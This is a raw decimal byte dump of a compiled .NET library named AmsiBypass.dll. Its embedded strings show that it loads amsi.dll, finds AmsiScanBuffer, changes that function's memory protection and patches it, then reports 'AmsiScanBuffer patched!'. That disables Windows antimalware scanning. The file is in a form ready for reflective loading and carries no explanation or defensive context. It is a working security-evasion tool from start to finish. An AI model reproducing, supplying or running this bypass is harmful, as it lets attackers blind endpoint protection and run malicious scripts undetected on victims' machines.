0, 0, 0, 0, 11, 44, 0, 0, 79, 0, 0, 0, 0, 64, 0, 0, 48, 3, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 96, 0, 0, 12, 0, 0, 0, 44, 43, 0, 0, 84, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 32, 0, 0, 8, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 8, 32, 0, 0, 72, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 46, 116, 101, 120, 116, 0, 0, 0, 108, 12, 0, 0, 0, 32, 0, 0, 0, 14, 0, 0, 0, 2, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 32, 0, 0, 96, 46, 114, 115, 114, 99, 0, 0, 0, 48, 3, 0, 0, 0, 64, 0, 0, 0, 4, 0, 0, 0, 16, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 64, 0, 0, 64, 46, 114, 101, 108, 111, 99, 0, 0, 12, 0, 0, 0, 0, 96, 0, 0, 0, 2, 0, 0, 0, 20, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 64, 0, 0, 66, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 63, 44, 0, 0, 0, 0, 0, 0, 72, 0, 0, 0, 2, 0, 5, 0, 64, 33, 0, 0, 236, 9, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 19, 48, 4, 0, 217, 0, 0, 0, 1, 0, 0, 17, 0, 114, 1, 0, 0, 112, 40, 1, 0, 0, 6, 10, 6, 126, 12, 0, 0, 10, 40, 13, 0, 0, 10, 19, 6, 17, 6, 44, 20, 0, 114, 19, 0, 0, 112, 40, 14, 0, 0, 10, 0, 23, 19, 7, 56, 165, 0, 0, 0, 6, 114, 107, 0, 0, 112, 40, 2, 0, 0, 6, 11, 7, 126, 12, 0, 0, 10, 40, 13, 0, 0, 10, 19, 8, 17, 8, 44, 17, 0, 114, 137, 0, 0, 112, 40, 14, 0, 0, 10, 0, 23, 19, 7, 43, 119, 26, 106, 40, 15, 0, 0, 10, 12, 22, 13, 7, 8, 31, 64, 18, 3, 40, 3, 0, 0, 6, 22, 254, 1, 19, 9, 17, 9, 44, 17, 0, 114, 255, 0, 0, 112, 40, 14, 0, 0, 10, 0, 23, 19, 7, 43, 72, 25, 141, 18, 0, 0, 1, 37, 208, 1, 0, 0, 4, 40, 16, 0, 0, 10, 19, 4, 25, 40, 17, 0, 0, 10, 19, 5, 17, 4, 22, 17, 5, 25, 40, 18, 0, 0, 10, 0, 7, 31, 27, 40, 19, 0, 0, 10, 17, 5, 25, 40, 4, 0, 0, 6, 0, 114, 117, 1, 0, 112, 40, 14, 0, 0, 10, 0, 22, 19, 7, 43, 0, 17, 7, 42, 34, 2, 40, 20, 0, 0, 10, 0, 42, 0, 0, 66, 83, 74, 66, 1, 0, 1, 0, 0, 0, 0, 0, 12, 0, 0, 0, 118, 52, 46, 48, 46, 51, 48, 51, 49, 57, 0, 0, 0, 0, 5, 0, 108, 0, 0, 0, 212, 2, 0, 0, 35, 126, 0, 0, 64, 3, 0, 0, 176, 3, 0, 0, 35, 83, 116, 114, 105, 110, 103, 115, 0, 0, 0, 0, 240, 6, 0, 0, 204, 1, 0, 0, 35, 85, 83, 0, 188, 8, 0, 0, 16, 0, 0, 0, 35, 71, 85, 73, 68, 0, 0, 0, 204, 8, 0, 0, 32, 1, 0, 0, 35, 66, 108, 111, 98, 0, 0, 0, 0, 0, 0, 0, 2, 0, 0, 1, 87, 149, 2, 52, 9, 2, 0, 0, 0, 250, 1, 51, 0, 22, 0, 0, 1, 0, 0, 0, 22, 0, 0, 0, 4, 0, 0, 0, 1, 0, 0, 0, 6, 0, 0, 0, 10, 0, 0, 0, 20, 0, 0, 0, 11, 0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 2, 0, 0, 0, 4, 0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 0, 0, 85, 2, 1, 0, 0, 0, 0, 0, 6, 0, 141, 1, 206, 2, 6, 0, 223, 1, 206, 2, 6, 0, 231, 0, 156, 2, 15, 0, 238, 2, 0, 0, 6, 0, 18, 1, 14, 2, 6, 0, 198, 1, 107, 2, 6, 0, 110, 1, 107, 2, 6, 0, 43, 1, 107, 2, 6, 0, 72, 1, 107, 2, 6, 0, 173, 1, 107, 2, 6, 0, 251, 0, 107, 2, 6, 0, 48, 3, 100, 2, 6, 0, 204, 0, 206, 2, 6, 0, 194, 0, 100, 2, 6, 0, 149, 2, 100, 2, 6, 0, 154, 0, 100, 2, 6, 0, 148, 2, 100, 2, 6, 0, 253, 1, 100, 2, 6, 0, 253, 2, 206, 2, 6, 0, 125, 3, 100, 2, 6, 0, 135, 0, 100, 2, 6, 0, 64, 2, 175, 2, 0, 0, 0, 0, 38, 0, 0, 0, 0, 0, 1, 0, 1, 0, 1, 0, 16, 0, 46, 2, 16, 3, 49, 0, 1, 0, 1, 0, 0, 1, 0, 0, 47, 0, 0, 0, 49, 0, 1, 0, 7, 0, 19, 1, 0, 0, 10, 0, 0, 0, 57, 0, 2, 0, 7, 0, 51, 1, 78, 0, 91, 0, 0, 0, 0, 0, 128, 0, 150, 32, 136, 3, 95, 0, 1, 0, 0, 0, 0, 0, 128, 0, 150, 32, 23, 3, 100, 0, 2, 0, 0, 0, 0, 0, 128, 0, 150, 32, 70, 3, 106, 0, 4, 0, 0, 0, 0, 0, 128, 0, 145, 32, 151, 3, 115, 0, 8, 0, 80, 32, 0, 0, 0, 0, 150, 0, 40, 2, 122, 0, 11, 0, 53, 33, 0, 0, 0, 0, 134, 24, 142, 2, 6, 0, 11, 0, 0, 0, 1, 0, 179, 0, 0, 0, 1, 0, 162, 0, 0, 0, 2, 0, 170, 0, 0, 0, 1, 0, 38, 3, 0, 0, 2, 0, 2, 2, 0, 0, 3, 0, 85, 3, 2, 0, 4, 0, 55, 3, 0, 0, 1, 0, 110, 3, 0, 0, 2, 0, 119, 0, 0, 0, 3, 0, 9, 2, 9, 0, 142, 2, 1, 0, 17, 0, 142, 2, 6, 0, 25, 0, 142, 2, 10, 0, 41, 0, 142, 2, 16, 0, 49, 0, 142, 2, 16, 0, 57, 0, 142, 2, 16, 0, 65, 0, 142, 2, 16, 0, 73, 0, 142, 2, 16, 0, 81, 0, 142, 2, 16, 0, 89, 0, 142, 2, 16, 0, 105, 0, 142, 2, 6, 0, 121, 0, 137, 2, 35, 0, 121, 0, 162, 3, 38, 0, 129, 0, 184, 0, 44, 0, 137, 0, 98, 3, 49, 0, 153, 0, 115, 3, 54, 0, 177, 0, 51, 2, 62, 0, 177, 0, 131, 3, 67, 0, 121, 0, 125, 2, 76, 0, 97, 0, 142, 2, 6, 0, 46, 0, 11, 0, 126, 0, 46, 0, 19, 0, 135, 0, 46, 0, 27, 0, 166, 0, 46, 0, 35, 0, 175, 0, 46, 0, 43, 0, 230, 0, 46, 0, 51, 0, 246, 0, 46, 0, 59, 0, 1, 1, 46, 0, 67, 0, 14, 1, 46, 0, 75, 0, 230, 0, 46, 0, 83, 0, 230, 0, 99, 0, 91, 0, 25, 1, 1, 0, 3, 0, 0, 0, 4, 0, 21, 0, 1, 0, 72, 2, 0, 1, 3, 0, 136, 3, 1, 0, 0, 1, 5, 0, 23, 3, 1, 0, 0, 1, 7, 0, 70, 3, 1, 0, 0, 1, 9, 0, 148, 3, 2, 0, 100, 44, 0, 0, 1, 0, 4, 128, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 12, 3, 0, 0, 2, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 82, 0, 123, 0, 0, 0, 0, 0, 4, 0, 3, 0, 0, 0, 0, 0, 0, 107, 101, 114, 110, 101, 108, 51, 50, 0, 95, 95, 83, 116, 97, 116, 105, 99, 65, 114, 114, 97, 121, 73, 110, 105, 116, 84, 121, 112, 101, 83, 105, 122, 101, 61, 51, 0, 60, 77, 111, 100, 117, 108, 101, 62, 0, 60, 80, 114, 105, 118, 97, 116, 101, 73, 109, 112, 108, 101, 109, 101, 110, 116, 97, 116, 105, 111, 110, 68, 101, 116, 97, 105, 108, 115, 62, 0, 53, 49, 67, 65, 70, 66, 52, 56, 49, 51, 57, 66, 48, 50, 69, 48, 54, 49, 68, 52, 57, 49, 57, 67, 53, 49, 55, 54, 54, 50, 49, 66, 70, 56, 55, 68, 65, 67, 69, 68, 0, 115, 114, 99, 0, 110, 101, 116, 115, 116, 97, 110, 100, 97, 114, 100, 0, 82, 117, 110, 116, 105, 109, 101, 70, 105, 101, 108, 100, 72, 97, 110, 100, 108, 101, 0, 67, 111, 110, 115, 111, 108, 101, 0, 104, 77, 111, 100, 117, 108, 101, 0, 112, 114, 111, 99, 78, 97, 109, 101, 0, 110, 97, 109, 101, 0, 87, 114, 105, 116, 101, 76, 105, 110, 101, 0, 86, 97, 108, 117, 101, 84, 121, 112, 101, 0, 67, 111, 109, 112, 105, 108, 101, 114, 71, 101, 110, 101, 114, 97, 116, 101, 100, 65, 116, 116, 114, 105, 98, 117, 116, 101, 0, 68, 101, 98, 117, 103, 103, 97, 98, 108, 101, 65, 116, 116, 114, 105, 98, 117, 116, 101, 0, 65, 115, 115, 101, 109, 98, 108, 121, 84, 105, 116, 108, 101, 65, 116, 116, 114, 105, 98, 117, 116, 101, 0, 84, 97, 114, 103, 101, 116, 70, 114, 97, 109, 101, 119, 111, 114, 107, 65, 116, 116, 114, 105, 98, 117, 116, 101, 0, 65, 115, 115, 101, 109, 98, 108, 121, 70, 105, 108, 101, 86, 101, 114, 115, 105, 111, 110, 65, 116, 116, 114, 105, 98, 117, 116, 101, 0, 65, 115, 115, 101, 109, 98, 108, 121, 73, 110, 102, 111, 114, 109, 97, 116, 105, 111, 110, 97, 108, 86, 101, 114, 115, 105, 111, 110, 65, 116, 116, 114, 105, 98, 117, 116, 101, 0, 65, 115, 115, 101, 109, 98, 108, 121, 67, 111, 110, 102, 105, 103, 117, 114, 97, 116, 105, 111, 110, 65, 116, 116, 114, 105, 98, 117, 116, 101, 0, 67, 111, 109, 112, 105, 108, 97, 116, 105, 111, 110, 82, 101, 108, 97, 120, 97, 116, 105, 111, 110, 115, 65, 116, 116, 114, 105, 98, 117, 116, 101, 0, 65, 115, 115, 101, 109, 98, 108, 121, 80, 114, 111, 100, 117, 99, 116, 65, 116, 116, 114, 105, 98, 117, 116, 101, 0, 65, 115, 115, 101, 109, 98, 108, 121, 67, 111, 109, 112, 97, 110, 121, 65, 116, 116, 114, 105, 98, 117, 116, 101, 0, 82, 117, 110, 116, 105, 109, 101, 67, 111, 109, 112, 97, 116, 105, 98, 105, 108, 105, 116, 121, 65, 116, 116, 114, 105, 98, 117, 116, 101, 0, 66, 121, 116, 101, 0, 100, 119, 83, 105, 122, 101, 0, 115, 105, 122, 101, 0, 83, 121, 115, 116, 101, 109, 46, 82, 117, 110, 116, 105, 109, 101, 46, 86, 101, 114, 115, 105, 111, 110, 105, 110, 103, 0, 80, 97, 116, 99, 104, 0, 65, 109, 115, 105, 0, 65, 108, 108, 111, 99, 72, 71, 108, 111, 98, 97, 108, 0, 77, 97, 114, 115, 104, 97, 108, 0, 107, 101, 114, 110, 101, 108, 51, 50, 46, 100, 108, 108, 0, 65, 109, 115, 105, 66, 121, 112, 97, 115, 115, 46, 100, 108, 108, 0, 83, 121, 115, 116, 101, 109, 0, 83, 121, 115, 116, 101, 109, 46, 82, 101, 102, 108, 101, 99, 116, 105, 111, 110, 0, 111, 112, 95, 65, 100, 100, 105, 116, 105, 111, 110, 0, 90, 101, 114, 111, 0, 46, 99, 116, 111, 114, 0, 85, 73, 110, 116, 80, 116, 114, 0, 83, 121, 115, 116, 101, 109, 46, 68, 105, 97, 103, 110, 111, 115, 116, 105, 99, 115, 0, 83, 121, 115, 116, 101, 109, 46, 82, 117, 110, 116, 105, 109, 101, 46, 73, 110, 116, 101, 114, 111, 112, 83, 101, 114, 118, 105, 99, 101, 115, 0, 83, 121, 115, 116, 101, 109, 46, 82, 117, 110, 116, 105, 109, 101, 46, 67, 111, 109, 112, 105, 108, 101, 114, 83, 101, 114, 118, 105, 99, 101, 115, 0, 68, 101, 98, 117, 103, 103, 105, 110, 103, 77, 111, 100, 101, 115, 0, 82, 117, 110, 116, 105, 109, 101, 72, 101, 108, 112, 101, 114, 115, 0, 65, 109, 115, 105, 66, 121, 112, 97, 115, 115, 0, 71, 101, 116, 80, 114, 111, 99, 65, 100, 100, 114, 101, 115, 115, 0, 108, 112, 65, 100, 100, 114, 101, 115, 115, 0, 79, 98, 106, 101, 99, 116, 0, 108, 112, 102, 108, 79, 108, 100, 80, 114, 111, 116, 101, 99, 116, 0, 86, 105, 114, 116, 117, 97, 108, 80, 114, 111, 116, 101, 99, 116, 0, 102, 108, 78, 101, 119, 80, 114, 111, 116, 101, 99, 116, 0, 111, 112, 95, 69, 120, 112, 108, 105, 99, 105, 116, 0, 100, 101, 115, 116, 0, 73, 110, 105, 116, 105, 97, 108, 105, 122, 101, 65, 114, 114, 97, 121, 0, 67, 111, 112, 121, 0, 76, 111, 97, 100, 76, 105, 98, 114, 97, 114, 121, 0, 82, 116, 108, 77, 111, 118, 101, 77, 101, 109, 111, 114, 121, 0, 111, 112, 95, 69, 113, 117, 97, 108, 105, 116, 121, 0, 0, 0, 0, 17, 97, 0, 109, 0, 115, 0, 105, 0, 46, 0, 100, 0, 108, 0, 108, 0, 0, 87, 69, 0, 82, 0, 82, 0, 79, 0, 82, 0, 58, 0, 32, 0, 67, 0, 111, 0, 117, 0, 108, 0, 100, 0, 32, 0, 110, 0, 111, 0, 116, 0, 32, 0, 114, 0, 101, 0, 116, 0, 114, 0, 105, 0, 101, 0, 118, 0, 101, 0, 32, 0, 97, 0, 109, 0, 115, 0, 105, 0, 46, 0, 100, 0, 108, 0, 108, 0, 32, 0, 112, 0, 111, 0, 105, 0, 110, 0, 116, 0, 101, 0, 114, 0, 33, 0, 0, 29, 65, 0, 109, 0, 115, 0, 105, 0, 83, 0, 99, 0, 97, 0, 110, 0, 66, 0, 117, 0, 102, 0, 102, 0, 101, 0, 114, 0, 0, 117, 69, 0, 82, 0, 82, 0, 79, 0, 82, 0, 58, 0, 32, 0, 67, 0, 111, 0, 117, 0, 108, 0, 100, 0, 32, 0, 110, 0, 111, 0, 116, 0, 32, 0, 114, 0, 101, 0, 116, 0, 114, 0, 105, 0, 101, 0, 118, 0, 101, 0, 32, 0, 65, 0, 109, 0, 115, 0, 105, 0, 83, 0, 99, 0, 97, 0, 110, 0, 66, 0, 117, 0, 102, 0, 102, 0, 101, 0, 114, 0, 32, 0, 102, 0, 117, 0, 110, 0, 99, 0, 116, 0, 105, 0, 111, 0, 110, 0, 32, 0, 112, 0, 111, 0, 105, 0, 110, 0, 116, 0, 101, 0, 114, 0, 33, 0, 0, 117, 69, 0, 82, 0, 82, 0, 79, 0, 82, 0, 58, 0, 32, 0, 67, 0, 111, 0, 117, 0, 108, 0, 100, 0, 32, 0, 110, 0, 111, 0, 116, 0, 32, 0, 109, 0, 111, 0, 100, 0, 105, 0, 102, 0, 121, 0, 32, 0, 65, 0, 109, 0, 115, 0, 105, 0, 83, 0, 99, 0, 97, 0, 110, 0, 66, 0, 117, 0, 102, 0, 102, 0, 101, 0, 114, 0, 32, 0, 109, 0, 101, 0, 109, 0, 111, 0, 114, 0, 121, 0, 32, 0, 112, 0, 101, 0, 114, 0, 109, 0, 105, 0, 115, 0, 115, 0, 105, 0, 111, 0, 110, 0, 115, 0, 33, 0, 0, 83, 71, 0, 114, 0, 101, 0, 97, 0, 116, 0, 32, 0, 115, 0, 117, 0, 99, 0, 99, 0, 101, 0, 115, 0, 115, 0, 46, 0, 32, 0, 65, 0, 109, 0, 115, 0, 105, 0, 83, 0, 99, 0, 97, 0, 110, 0, 66, 0, 117, 0, 102, 0, 102, 0, 101, 0, 114, 0, 32, 0, 112, 0, 97, 0, 116, 0, 99, 0, 104, 0, 101, 0, 100, 0, 33, 0, 32, 0, 58, 0, 41, 0, 0, 0, 0, 0, 94, 196, 134, 67, 207, 43, 76, 71, 180, 110, 209, 17, 221, 107, 164, 138, 0, 4, 32, 1, 1, 8, 3, 32, 0, 1, 5, 32, 1, 1, 17, 17, 4, 32, 1, 1, 14, 13, 7, 10, 24, 24, 25, 9, 29, 5, 24, 2, 8, 2, 2, 2, 6, 24, 5, 0, 2, 2, 24, 24, 4, 0, 1, 1, 14, 4, 0, 1, 25, 11, 7, 0, 2, 1, 18, 81, 17, 85, 4, 0, 1, 24, 8, 8, 0, 4, 1, 29, 5, 8, 24, 8, 5, 0, 2, 24, 24, 8, 8, 204, 123, 19, 255, 205, 45, 221, 81, 3, 6, 17, 16, 4, 0, 1, 24, 14, 5, 0, 2, 24, 24, 14, 8, 0, 4, 2, 24, 25, 9, 16, 9, 6, 0, 3, 1, 24, 24, 8, 3, 0, 0, 8, 8, 1, 0, 8, 0, 0, 0, 0, 0, 30, 1, 0, 1, 0, 84, 2, 22, 87, 114, 97, 112, 78, 111, 110, 69, 120, 99, 101, 112, 116, 105, 111, 110, 84, 104, 114, 111, 119, 115, 1, 8, 1, 0, 7, 1, 0, 0, 0, 0, 54, 1, 0, 25, 46, 78, 69, 84, 83, 116, 97, 110, 100, 97, 114, 100, 44, 86, 101, 114, 115, 105, 111, 110, 61, 118, 50, 46, 48, 1, 0, 84, 14, 20, 70, 114, 97, 109, 101, 119, 111, 114, 107, 68, 105, 115, 112, 108, 97, 121, 78, 97, 109, 101, 0, 15, 1, 0, 10, 65, 109, 115, 105, 66, 121, 112, 97, 115, 115, 0, 0, 10, 1, 0, 5, 68, 101, 98, 117, 103, 0, 0, 12, 1, 0, 7, 49, 46, 48, 46, 48, 46, 48, 0, 0, 10, 1, 0, 5, 49, 46, 48, 46, 48, 0, 0, 4, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 32, 92, 168, 168, 0, 1, 77, 80, 2, 0, 0, 0, 100, 0, 0, 0, 128, 43, 0, 0, 128, 13, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 19, 0, 0, 0, 39, 0, 0, 0, 228, 43, 0, 0, 228, 13, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 16, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 82, 83, 68, 83, 215, 18, 206, 3, 139, 112, 185, 73, 189, 89, 99, 32, 233, 159, 0, 221, 1, 0, 0, 0, 47, 111, 112, 116, 47, 80, 114, 111, 106, 101, 99, 116, 115, 47, 65, 109, 115, 105, 66, 121, 112, 97, 115, 115, 47, 65, 109, 115, 105, 66, 121, 112, 97, 115, 115, 47, 111, 98, 106, 47, 68, 101, 98, 117, 103, 47, 110, 101, 116, 115, 116, 97, 110, 100, 97, 114, 100, 50, 46, 48, 47, 65, 109, 115, 105, 66, 121, 112, 97, 115, 115, 46, 112, 100, 98, 0, 83, 72, 65, 50, 53, 54, 0, 215, 18, 206, 3, 139, 112, 185, 169, 125, 89, 99, 32, 233, 159, 0, 221, 32, 92, 168, 40, 54, 252, 229, 155, 150, 128, 72, 101, 126, 213, 146, 143, 51, 44, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 77, 44, 0, 0, 0, 32, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 63, 44, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 95, 67, 111, 114, 68, 108, 108, 77, 97, 105, 110, 0, 109, 115, 99, 111, 114, 101, 101, 46, 100, 108, 108, 0, 0, 0, 0, 0, 0, 255, 37, 0, 32, 0, 16, 49, 255, 144, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 16, 0, 0, 0, 24, 0, 0, 128, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 1, 0, 0, 0, 48, 0, 0, 128, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 72, 0, 0, 0, 88, 64, 0, 0, 212, 2, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 212, 2, 52, 0, 0, 0, 86, 0, 83, 0, 95, 0, 86, 0, 69, 0, 82, 0, 83, 0, 73, 0, 79, 0, 78, 0, 95, 0, 73, 0, 78, 0, 70, 0, 79, 0, 0, 0, 0, 0, 189, 4, 239, 254, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 63, 0, 0, 0, 0, 0, 0, 0, 4, 0, 0, 0, 2, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 68, 0, 0, 0, 1, 0, 86, 0, 97, 0, 114, 0, 70, 0, 105, 0, 108, 0, 101, 0, 73, 0, 110, 0, 102, 0, 111, 0, 0, 0, 0, 0, 36, 0, 4, 0, 0, 0, 84, 0, 114, 0, 97, 0, 110, 0, 115, 0, 108, 0, 97, 0, 116, 0, 105, 0, 111, 0, 110, 0, 0, 0, 0, 0, 0, 0, 176, 4, 52, 2, 0, 0, 1, 0, 83, 0, 116, 0, 114, 0, 105, 0, 110, 0, 103, 0, 70, 0, 105, 0, 108, 0, 101, 0, 73, 0, 110, 0, 102, 0, 111, 0, 0, 0, 16, 2, 0, 0, 1, 0, 48, 0, 48, 0, 48, 0, 48, 0, 48, 0, 52, 0, 98, 0, 48, 0, 0, 0, 54, 0, 11, 0, 1, 0, 67, 0, 111, 0, 109, 0, 112, 0, 97, 0, 110, 0, 121, 0, 78, 0, 97, 0, 109, 0, 101, 0, 0, 0, 0, 0, 65, 0, 109, 0, 115, 0, 105, 0, 66, 0, 121, 0, 112, 0, 97, 0, 115, 0, 115, 0, 0, 0, 0, 0, 62, 0, 11, 0, 1, 0, 70, 0, 105, 0, 108, 0, 101, 0, 68, 0, 101, 0, 115, 0, 99, 0, 114, 0, 105, 0, 112, 0, 116, 0, 105, 0, 111, 0, 110, 0, 0, 0, 0, 0, 65, 0, 109, 0, 115, 0, 105, 0, 66, 0, 121, 0, 112, 0, 97, 0, 115, 0, 115, 0, 0, 0, 0, 0, 48, 0, 8, 0, 1, 0, 70, 0, 105, 0, 108, 0, 101, 0, 86, 0, 101, 0, 114, 0, 115, 0, 105, 0, 111, 0, 110, 0, 0, 0, 0, 0, 49, 0, 46, 0, 48, 0, 46, 0, 48, 0, 46, 0, 48, 0, 0, 0, 62, 0, 15, 0, 1, 0, 73, 0, 110, 0, 116, 0, 101, 0, 114, 0, 110, 0, 97, 0, 108, 0, 78, 0, 97, 0, 109, 0, 101, 0, 0, 0, 65, 0, 109, 0, 115, 0, 105, 0, 66, 0, 121, 0, 112, 0, 97, 0, 115, 0, 115, 0, 46, 0, 100, 0, 108, 0, 108, 0, 0, 0, 0, 0, 40, 0, 2, 0, 1, 0, 76, 0, 101, 0, 103, 0, 97, 0, 108, 0, 67, 0, 111, 0, 112, 0, 121, 0, 114, 0, 105, 0, 103, 0, 104, 0, 116, 0, 0, 0, 32, 0, 0, 0, 70, 0, 15, 0, 1, 0, 79, 0, 114, 0, 105, 0, 103, 0, 105, 0, 110, 0, 97, 0, 108, 0, 70, 0, 105, 0, 108, 0, 101, 0, 110, 0, 97, 0, 109, 0, 101, 0, 0, 0, 65, 0, 109, 0, 115, 0, 105, 0, 66, 0, 121, 0, 112, 0, 97, 0, 115, 0, 115, 0, 46, 0, 100, 0, 108, 0, 108, 0, 0, 0, 0, 0, 54, 0, 11, 0, 1, 0, 80, 0, 114, 0, 111, 0, 100, 0, 117, 0, 99, 0, 116, 0, 78, 0, 97, 0, 109, 0, 101, 0, 0, 0, 0, 0, 65, 0, 109, 0, 115, 0, 105, 0, 66, 0, 121, 0, 112, 0, 97, 0, 115, 0, 115, 0, 0, 0, 0, 0, 48, 0, 6, 0, 1, 0, 80, 0, 114, 0, 111, 0, 100, 0, 117, 0, 99, 0, 116, 0, 86, 0, 101, 0, 114, 0, 115, 0, 105, 0, 111, 0, 110, 0, 0, 0, 49, 0, 46, 0, 48, 0, 46, 0, 48, 0, 0, 0, 56, 0, 8, 0, 1, 0, 65, 0, 115, 0, 115, 0, 101, 0, 109, 0, 98, 0, 108, 0, 121, 0, 32, 0, 86, 0, 101, 0, 114, 0, 115, 0, 105, 0, 111, 0, 110, 0, 0, 0, 49, 0, 46, 0, 48, 0, 46, 0, 48, 0, 46, 0, 48, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 32, 0, 0, 12, 0, 0, 0, 96, 60, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 